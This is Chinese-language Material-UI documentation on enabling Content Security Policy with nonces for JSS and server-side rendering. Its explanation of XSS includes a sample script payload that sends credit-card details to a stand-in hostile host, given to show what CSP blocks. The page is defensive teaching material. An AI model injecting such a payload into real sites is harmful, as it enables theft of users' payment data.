# CSP（网页安全政策）

<p class="description">Material-UI 支持网页安全政策的标题。</p>

## 什么是网页安全政策？为什么它有用？

基本上，网页安全政策通过要求开发人员将其资源从中检索的源列入白名单来缓解跨站点脚本（XSS）的攻击。 此列表作为服务器的头信息返回。 例如，假设您有一个托管在 `https://example.com` 网站 CSP 头信息的 `default-src：'self';`，这将加载位于`https://example.com/*`的所有资源，并阻止加载其他的。 如果您的网站的某个部分容易受到 XSS 的影响而未显示未转义的用户输入，攻击者可以输入以下内容：

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>
    

攻击者可以利用此漏洞执行任何操作。 但是，使用安全的 CSP 头信息，浏览器将不会加载此脚本。

您可以[在此处](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)阅读有关 CSP 的更多信息。

## 如何启用 CSP？

为了将 CSP 与Material-UI（和JSS）一起使用，您需要使用一个 nonce（随机数）。 随机数是一个随机生成的只使用一次的字符串，因此您需要添加一个服务器中间件，这样在每个请求上都能生成一个随机数。 JSS 有一个关于如何使用 Express 和 React Helmet 实现这一目标的[很棒的教程](https://github.com/cssinjs/jss/blob/master/docs/csp.md)。 关于一些基本的纲要，请继续阅读。

一个 CSP 的随机数是一个 Base 64编码的字符串。 你可以生成这样一个：

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

使用 UUID 版本4是非常重要的，因为它会生成一个**不可预测**字符串。 然后，您可以将此随机数附加于 CSP 头信息中。 当附加了随机数的时候，CSP 头信息可能看起来像这样：

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

如果使用服务器端渲染（SSR），您则需要将在在服务器上的 `<style>` 标签中传入随机数。

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
/>
```

然后，您必须将此随机数传递给 JSS ，以便将其添加到后续的 `<style>` 标签当中。 客户端将从头信息中获取随机数。 不管您使不适用服务器端渲染，您都必须包含此头信息。

```jsx
<meta property="csp-nonce" content={nonce} />
```